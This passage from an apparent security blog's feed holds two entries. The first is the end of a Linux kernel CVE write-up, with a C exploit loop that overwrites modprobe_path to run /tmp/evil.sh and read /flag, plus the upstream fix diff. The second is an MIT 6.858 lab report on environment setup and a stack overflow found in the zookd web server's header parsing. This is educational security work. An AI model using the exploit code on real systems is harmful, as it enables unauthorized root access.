class="hljs-string">&quot;/tmp/evil.sh&quot;</span>, O_RDWR | O_CREAT);<br>    write(shell_fd, cat_flag, <span class="hljs-keyword">sizeof</span>(cat_flag));<br>    close(shell_fd);<br>    system(<span class="hljs-string">&quot;chmod +x /tmp/evil.sh&quot;</span>);<br><br>    <span class="hljs-comment">/* exploit */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; <span class="hljs-number">1</span>; i++) &#123;<br>        <span class="hljs-type">int</span> flag_fd;<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] trying arbitrary write for no.%d time...\n&quot;</span>, i);<br><br>        arbitraryWriteByMsg();<br>        system(<span class="hljs-string">&quot;/tmp/fake&quot;</span>);<br><br>        flag_fd = open(<span class="hljs-string">&quot;/flag&quot;</span>, O_RDWR);<br>        <span class="hljs-keyword">if</span> (flag_fd &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Successfully overwrite the modprobe_path!&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1>0x03.漏洞修复</h1><p>该漏洞在内核主线的 <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=722d94847de29310e8aa03fcbdb41fc92c521756">这个 commit</a> 当中被修复，主要就是将减法换成了加法，避免了无符号整型下溢的问题，笔者认为这个修复还是比较成功的：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-comment">diff --git a/fs/fs_context.c b/fs/fs_context.c</span><br><span class="hljs-comment">index b7e43a780a625..24ce12f0db32e 100644</span><br><span class="hljs-comment">--- a/fs/fs_context.c</span><br><span class="hljs-comment">+++ b/fs/fs_context.c</span><br><span class="hljs-meta">@@ -548,7 +548,7 @@</span> static int legacy_parse_param(struct fs_context *fc, struct fs_parameter *param)<br>       param-&gt;key);<br> &#125;<br> <br><span class="hljs-deletion">-if (len &gt; PAGE_SIZE - 2 - size)</span><br><span class="hljs-addition">+if (size + len + 2 &gt; PAGE_SIZE)</span><br> return invalf(fc, &quot;VFS: Legacy: Cumulative options too large&quot;);<br> if (strchr(param-&gt;key, &#x27;,&#x27;) ||<br>     (param-&gt;type == fs_value_is_string &amp;&amp;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;还是 mount 好&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/categories/CVE/"/>
    
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/tags/CVE/"/>
    
    <category term="提权" scheme="http://blog.arttnba3.cn/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>【EXPR.0x01】MIT 6.858 课程实验报告</title>
    <link href="http://blog.arttnba3.cn/2022/12/25/EXPR-0X01-MIT_6_858/"/>
    <id>http://blog.arttnba3.cn/2022/12/25/EXPR-0X01-MIT_6_858/</id>
    <published>2022-12-24T18:15:28.000Z</published>
    <updated>2022-12-24T18:15:37.843Z</updated>
    
    <content type="html"><![CDATA[<p>不如买个 CTF 课</p><span id="more"></span><h1>0x00. 一切开始之前</h1><p><a href="http://css.csail.mit.edu/6.858/2022/">MIT 6.858</a> 是面向高年级本科生与研究生开设的一门关于<strong>计算机系统安全</strong>（secure computer security）的课程，内容包括威胁模型（threat models）、危害安全的攻击（attacks that compromise security）、实现安全的技术（techniques for achieving security）</p><p>在 YouTube 上有<a href="https://www.youtube.com/playlist?list=PLUl4u3cNGP62K2DjQLRxDNRi0z2IRWnNh">往年的课程回放</a>，配有英文字幕，不过作为一个并非是对安全一无所知的安全小白，笔者主要还是挑自己不熟悉的那一块跳着听（笑）</p><p>这个课程一共有五个 Lab：</p><ul><li>Lab1：缓冲区溢出（buffer overflow）</li><li>Lab2：权限分离与服务侧沙箱（privilege separation and server-side sandboxing）</li><li>Lab3：符号执行（symbolic execution）</li><li>Lab4：浏览器安全（browser security）</li><li>Lab5：安全的文件系统（secure file system）</li></ul><p>前四个 Lab 主要是基于 MIT 开发的一个叫 <code>zookws</code> 的 web server 完成的</p><h2 id="PRE-环境搭建-说明">PRE. 环境搭建 &amp;&amp; 说明</h2><p>这里给出三种搭建实验环境的方式</p><h3 id="Method-I-（推荐）使用-MIT-提供的-VM-镜像">Method I.（推荐）使用 MIT 提供的 VM 镜像</h3><blockquote><p>参见 <a href="http://css.csail.mit.edu/6.858/2022/labs/lab1.html">Lab 1</a></p></blockquote><p>MIT 提供了一个  <a href="https://web.mit.edu/6.858/2022/6.858-x86_64-v22.zip">course VM image</a> ，其中有着一个 Ubuntu 21.10 的系统，登录的用户名为 <code>student</code>，密码为 <code>6858</code>，下载解压后根据自身的本地环境进行对应的操作：</p><ul><li>使用 KVM 运行：直接运行 <strong><code>./6.858-x86_64-v22.sh</code></strong> 即可</li><li>使用 VMware运行：新建虚拟机→稍后安装操作系统→选择系统 <code>Linux &gt; Debian 9.x 64-bit</code> →移除原有虚拟磁盘→添加新的虚拟磁盘→选择  <code>6.858-x86_64-v22.vmdk</code> 即可</li></ul><p>对于非 X86 架构的处理器环境，<s>👴的建议是别做了</s>，在实验手册里推荐安装 qemu ，笔者就不摘抄一遍了</p><p><img src="https://s2.loli.net/2022/12/07/bjhUwo5k9q8EiTJ.png" alt="image.png"></p><p>当然没有图形界面只有一个 tty 比较难受，所以这里还是推荐用 ssh 连上去做，因为虚拟机在本地所以直接 <code>ip addr show dev eth0</code> 找到 IP 后 <code>ssh student@YOUR_IP</code> 就行：</p><p><img src="https://s2.loli.net/2022/12/07/MJcV1zZdS5NvnjE.png" alt="image.png"></p><p>之后还是按惯例把代码拉到本地，并使用 <code>make</code> 构建一下 <code>zookws</code> 看有没有啥问题，没报错就🆗：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://web.mit.edu/6858/2022/lab.git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> lab</span><br><span class="hljs-meta prompt_">lab$ </span><span class="language-bash">make</span><br></code></pre></td></tr></table></figure><p>其中 <code>zookd</code> 负责接收 HTTP 请求，其由 C 编写，HTTP 相关的代码位于 <code>http.c</code> 中，HTTP 协议相关资料<a href="https://www.garshol.priv.no/download/text/http-tut.html">见此处</a></p><p>zookd 有两种版本：</p><ul><li><code>zookd-exstack</code>：栈具有可执行权限</li><li><code>zookd-nxstack</code>：栈不具有可执行权限</li></ul><p>用以进行评分的 <code>zookd</code> 位于 <code>bin.tar.gz</code> 中</p><p>此外，MIT 还提供了一个用以清理环境的 <code>clean-env.sh</code> 脚本，用以确保每次的执行环境都是相同的，我们可以通过如下命令运行 zookd：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./clean-env.sh ./zookd 8080</span><br></code></pre></td></tr></table></figure><p>之后我们便能在本地的 8080 端口访问到 zookd，直接进去大概会是这个样子：</p><p><img src="https://s2.loli.net/2022/11/29/KUG3v2uoqjm9nZg.png" alt="image.png"></p><h3 id="Method-II-自行配置本地实验环境">Method II. 自行配置本地实验环境</h3><p>首先是配环境，除了 <code>pwntools</code> 是笔者个人比较喜欢的一个编写 exp 的模块以外其他都是实验环境必须的：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo atp-get install -y curl strace lxc-dev</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo pip3 install sqlalchemy pwntools flask z3-solver angr bytecode lxc</span><br></code></pre></td></tr></table></figure><p>之后还是按惯例把代码拉到本地，并使用 <code>make</code> 构建一下 <code>zookws</code> 看有没有啥问题，没报错就🆗：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://web.mit.edu/6858/2022/lab.git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> lab</span><br><span class="hljs-meta prompt_">lab$ </span><span class="language-bash">make</span><br></code></pre></td></tr></table></figure><h3 id="Method-III-使用-docker-搭建实验环境">Method III.使用 docker 搭建实验环境</h3><p>因为评测用的二进制文件需要用较高版本的 libc（例如笔者用的就是 Ubuntu 20.04 with 过时的 libc2.31），同时也避免污染本地环境，因此使用 Docker 来完成实验也是一个需求项</p><blockquote><p>Dockerfile，注意替换上自己的公钥，如果没有从外部连接容器的需求的话这一步可以跳过</p></blockquote><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> ubuntu:<span class="hljs-number">22.04</span><br><br><span class="hljs-comment"># basic environment</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> sed -i <span class="hljs-string">&quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot;</span> /etc/apt/sources.list &amp;&amp; \</span><br><span class="language-bash">    apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \</span><br><span class="language-bash">    DEBIAN_FRONTEND=noninteractive \</span><br><span class="language-bash">    apt-get install -y git python3-pip tmux vim curl openssh-server strace gdb lxc lxc-dev</span><br><br><span class="hljs-comment"># sqlalchemy for lab, pwntools for my own</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> pip3 config <span class="hljs-built_in">set</span> global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> pip3 install sqlalchemy pwntools flask z3-solver angr bytecode lxc</span><br><br><span class="hljs-comment"># pwndbg for a better debug experience</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">cd</span> /root &amp;&amp; \</span><br><span class="language-bash">    git <span class="hljs-built_in">clone</span> https://github.com/pwndbg/pwndbg &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">cd</span> /root/pwndbg &amp;&amp; \</span><br><span class="language-bash">    ./setup.sh</span><br><br><span class="hljs-comment"># I&#x27;d like to make a new user for it</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> useradd -m student</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> usermod -s /bin/bash student</span><br><br><span class="hljs-comment"># clone the lab</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">cd</span> /home/student &amp;&amp; \</span><br><span class="language-bash">    git <span class="hljs-built_in">clone</span> https://web.mit.edu/6858/2022/lab.git &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">chown</span> -R student:student ./lab</span><br><br><span class="hljs-comment"># make your ssh key authorized</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">mkdir</span> /home/student/.ssh &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;这里写你的ssh公钥&quot;</span> &gt; /home/student/.ssh/authorized_keys</span><br><br><span class="hljs-comment"># start ssh service and keep container running continuously</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;#!/bin/bash\nservice ssh start\nsleep infinity&quot;</span> &gt; /root/start.sh &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">chmod</span> +x /root/start.sh</span><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;/root/start.sh&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>因为实验要关 ASLR 所以我们在启动 docker 时需要 <code>--privileged</code>，不过因为只是实验用的容器所以无所谓，同时为了外网能访问到所以这里配了几个端口转发：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo docker build -t <span class="hljs-string">&quot;mit_6858_img&quot;</span> .</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo docker run -d --privileged -p <span class="hljs-string">&quot;8080:8080&quot;</span> -p <span class="hljs-string">&quot;2022:22&quot;</span> -h <span class="hljs-string">&quot;mit_6858_docker&quot;</span> --name=<span class="hljs-string">&quot;mit_6858&quot;</span> mit_6858_img</span><br></code></pre></td></tr></table></figure><p>之后我们便能直接进到容器内部继续实验：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo docker <span class="hljs-built_in">exec</span> -it mit_6858 /bin/bash</span><br></code></pre></td></tr></table></figure><p>也可以通过 ssh 进行远程连接：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">ssh student@your_server_ip -p 2022</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/12/03/RqEPmQyLzUskg4e.png" alt="image.png"></p><h3 id="EXTRA-vscode-连接">EXTRA.vscode 连接</h3><p>因为我们的实验环境都有 ssh，所以直接用 vscode 通过 ssh 连接是非常方便的一件事情（容器配上端口转发也可以连接）</p><p>首先在扩展里找到 ssh 插件并安装</p><p><img src="https://s2.loli.net/2022/12/03/VlTkD8N5BPFUq7v.png" alt="image.png"></p><p>添加 host 信息</p><p><img src="https://s2.loli.net/2022/12/03/U4ORh8JaWXulVB2.png" alt="image.png"></p><p>之后直接连接上去就行了</p><p><img src="https://s2.loli.net/2022/12/03/vNnUWPgELZIByY4.png" alt="image.png"></p><h1>0x01. Lab1: Buffer overflows</h1><h2 id="Part-1-Finding-buffer-overflows">Part 1: Finding buffer overflows</h2><p>首先给了一个资料：<a href="https://thesquareplanet.com/blog/smashing-the-stack-21st-century/">Smashing the stack in the 21st century</a>，基础薄弱的同学可以仔细看看，笔者这里直接跳过，然后是 Exercise 1：</p><blockquote><p><strong>Exercise 1.</strong> Study the web server’s C code (in <code>zookd.c</code> and <code>http.c</code>), and find one example of code that allows an attacker to overwrite the return address of a function. Hint: look for buffers allocated on the stack. Write down a description of the vulnerability in the file <code>answers.txt</code>. For your vulnerability, describe the buffer which may overflow, how you would structure the input to the web server (i.e., the HTTP request) to overflow the buffer and overwrite the return address, and the call stack that will trigger the buffer overflow (i.e., the chain of function calls starting from <code>process_client</code>).</p><p>It is worth taking your time on this exercise and familiarizing yourself with the code, because your next job is to exploit the vulnerability you identified. In fact, you may want to go back and forth between this exercise and later exercises, as you work out the details and document them. That is, if you find a buffer overflow that you think can be exploited, you can use later exercises to figure out if it indeed can be exploited. It will be helpful to draw a stack diagram like the figures in <a href="https://thesquareplanet.com/blog/smashing-the-stack-21st-century/">Smashing the Stack in the 21st Century</a>.</p></blockquote><p>大概是阅读  <code>zookd.c</code> 和 <code>http.c</code> 找漏洞，提示关注在栈上分配的 buffer，并将答案写在 <code>answers.txt</code> 中~~（👴：❓）~~</p><p>首先看 <code>zookd.c</code>，源码比较简洁，核心逻辑在 <code>run_server()</code> 中，首先会调用 <code>start_server()</code> 创建一个 http 服务器，之后在 <code>run_server()</code> 中有一个无限循环调用 <code>accept()</code> 接收请求后 <code>fork()</code> 出子进程调用 <code>process_client()</code> 处理</p><h4 id="process-client-：处理单次-HTTP-request">process_client()：处理单次 HTTP request</h4><p><code>process_client()</code> 的逻辑也比较简单，主要是调用 <code>http_request_line()</code> 获取请求头第一行，之后给到 <code>env_deserialize()</code> 解析环境变量，之后调用 <code>http_request_headers()</code> 解析剩下的 header，最后调用 <code>http_serve()</code> 处理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">process_client</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-type">char</span> env[<span class="hljs-number">8192</span>];  <span class="hljs-comment">/* static variables are not on the stack */</span><br>    <span class="hljs-type">static</span> <span class="hljs-type">size_t</span> env_len = <span class="hljs-number">8192</span>;<br>    <span class="hljs-type">char</span> reqpath[<span class="hljs-number">4096</span>];<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *errmsg;<br><br>    <span class="hljs-comment">/* get the request line */</span><br>    <span class="hljs-keyword">if</span> ((errmsg = http_request_line(fd, reqpath, env, &amp;env_len)))<br>        <span class="hljs-keyword">return</span> http_err(fd, <span class="hljs-number">500</span>, <span class="hljs-string">&quot;http_request_line: %s&quot;</span>, errmsg);<br><br>    env_deserialize(env, <span class="hljs-keyword">sizeof</span>(env));<br><br>    <span class="hljs-comment">/* get all headers */</span><br>    <span class="hljs-keyword">if</span> ((errmsg = http_request_headers(fd)))<br>      http_err(fd, <span class="hljs-number">500</span>, <span class="hljs-string">&quot;http_request_headers: %s&quot;</span>, errmsg);<br>    <span class="hljs-keyword">else</span><br>      http_serve(fd, getenv(<span class="hljs-string">&quot;REQUEST_URI&quot;</span>));<br><br>    close(fd);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="http-request-line-：解析-header-第一行">http_request_line()：解析 header 第一行</h4><p>现在来看 <code>http_request_line()</code>，其首先调用了一个函数 <code>http_read_line()</code> 从 TCP 连接中读取一整行（read() 一个字节一个字节地读，一直读到 <code>\n</code> 并返回读取的字节数，对于 <code>\r</code> 自动跳过，失败则返回 <code>-1</code>，代码就不贴了）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">http_request_line</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">char</span> *reqpath, <span class="hljs-type">char</span> *env, <span class="hljs-type">size_t</span> *env_len)</span><br>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-type">char</span> buf[<span class="hljs-number">8192</span>];      <span class="hljs-comment">/* static variables are not on the stack */</span><br>    <span class="hljs-type">char</span> *sp1, *sp2, *qp, *envp = env;<br><br>    <span class="hljs-comment">/* For lab 2: don&#x27;t remove this line. */</span><br>    touch(<span class="hljs-string">&quot;http_request_line&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (http_read_line(fd, buf, <span class="hljs-keyword">sizeof</span>(buf)) &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Socket IO error&quot;</span>;<br></code></pre></td></tr></table></figure><p>之后解析路径与请求类型，主要就是用 <code>strchr()</code> 进行分隔后判断，并将结果写到 <code>env</code> 中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Parse request like &quot;GET /foo.html HTTP/1.0&quot; */</span><br>sp1 = <span class="hljs-built_in">strchr</span>(buf, <span class="hljs-string">&#x27; &#x27;</span>);<br><span class="hljs-keyword">if</span> (!sp1)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Cannot parse HTTP request (1)&quot;</span>;<br>*sp1 = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>sp1++;<br><span class="hljs-keyword">if</span> (*sp1 != <span class="hljs-string">&#x27;/&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Bad request path&quot;</span>;<br><br>sp2 = <span class="hljs-built_in">strchr</span>(sp1, <span class="hljs-string">&#x27; &#x27;</span>);<br><span class="hljs-keyword">if</span> (!sp2)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Cannot parse HTTP request (2)&quot;</span>;<br>*sp2 = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>sp2++;<br><br><span class="hljs-comment">/* We only support GET and POST requests */</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;GET&quot;</span>) &amp;&amp; <span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;POST&quot;</span>))<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Unsupported request (not GET or POST)&quot;</span>;<br><br>envp += <span class="hljs-built_in">sprintf</span>(envp, <span class="hljs-string">&quot;REQUEST_METHOD=%s&quot;</span>, buf) + <span class="hljs-number">1</span>;<br>envp += <span class="hljs-built_in">sprintf</span>(envp, <span class="hljs-string">&quot;SERVER_PROTOCOL=%s&quot;</span>, sp2) + <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>然后解析请求中的参数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* parse out query string, e.g. &quot;foo.py?user=bob&quot; */</span><br><span class="hljs-keyword">if</span> ((qp = <span class="hljs-built_in">strchr</span>(sp1, <span class="hljs-string">&#x27;?&#x27;</span>)))<br>&#123;<br>    *qp = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>    envp += <span class="hljs-built_in">sprintf</span>(envp, <span class="hljs-string">&quot;QUERY_STRING=%s&quot;</span>, qp + <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>之后调用 <code>url_decode(dst, src)</code> 解析 request URL，这个函数主要就是把 URL 里的 <code>%ab</code> 换成 <code>0xab</code> ，把 <code>+</code> 换成 空格，由 <code>src</code> 拷贝到 <code>dst</code> ；最后将结果写回 <code>env</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-comment">/* decode URL escape sequences in the requested path into reqpath */</span><br>    url_decode(reqpath, sp1);<br><br>    envp += <span class="hljs-built_in">sprintf</span>(envp, <span class="hljs-string">&quot;REQUEST_URI=%s&quot;</span>, reqpath) + <span class="hljs-number">1</span>;<br><br>    envp += <span class="hljs-built_in">sprintf</span>(envp, <span class="hljs-string">&quot;SERVER_NAME=zoobar.org&quot;</span>) + <span class="hljs-number">1</span>;<br><br>    *envp = <span class="hljs-number">0</span>;<br>    *env_len = envp - env + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="http-request-headers-：解析-header-剩余部分（存在漏洞）">http_request_headers()：解析 header 剩余部分（存在漏洞）</h4><p>进来首先是一个大循环，每次循环都会调用 <code>http_read_line()</code> 读取一行 header 进行解析：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">http_request_headers</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-type">char</span> buf[<span class="hljs-number">8192</span>];      <span class="hljs-comment">/* static variables are not on the stack */</span><br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-type">char</span> value[<span class="hljs-number">512</span>];<br>    <span class="hljs-type">char</span> envvar[<span class="hljs-number">512</span>];<br><br>    <span class="hljs-comment">/* For lab 2: don&#x27;t remove this line. */</span><br>    touch(<span class="hljs-string">&quot;http_request_headers&quot;</span>);<br><br>    <span class="hljs-comment">/* Now parse HTTP headers */</span><br>    <span class="hljs-keyword">for</span> (;;)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (http_read_line(fd, buf, <span class="hljs-keyword">sizeof</span>(buf)) &lt; <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Socket IO error&quot;</span>;<br><br>        <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;\0&#x27;</span>)     <span class="hljs-comment">/* end of headers */</span><br>            <span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure><p>之后是解析 <code>key: value</code> 型的值，首先是 <code>shrchr()</code> 按空格进行分割，然后将 <code>key</code> 转成大写且 <code>-</code> 转成 <code>_</code> ，之后调用 <code>url_decode()</code> 解析</p><ul><li>这里我们注意到 <code>value</code> 是一个<strong>位于函数栈上的字符数组，长度仅为 512</strong>，而该 HTTP server 所允许的单行最大长度为 8192 字符，这意味着<strong>我们可以很轻易地通过传入一个较长的键值对参数来完成栈溢出</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Parse things like &quot;Cookie: foo bar&quot; */</span><br><span class="hljs-type">char</span> *sp = <span class="hljs-built_in">strchr</span>(buf, <span class="hljs-string">&#x27; &#x27;</span>);<br><span class="hljs-keyword">if</span> (!sp)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Header parse error (1)&quot;</span>;<br>*sp = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>sp++;<br><br><span class="hljs-comment">/* Strip off the colon, making sure it&#x27;s there */</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strlen</span>(buf) == <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Header parse error (2)&quot;</span>;<br><br><span class="hljs-type">char</span> *colon = &amp;buf[<span class="hljs-built_in">strlen</span>(buf) - <span class="hljs-number">1</span>];<br><span class="hljs-keyword">if</span> (*colon != <span 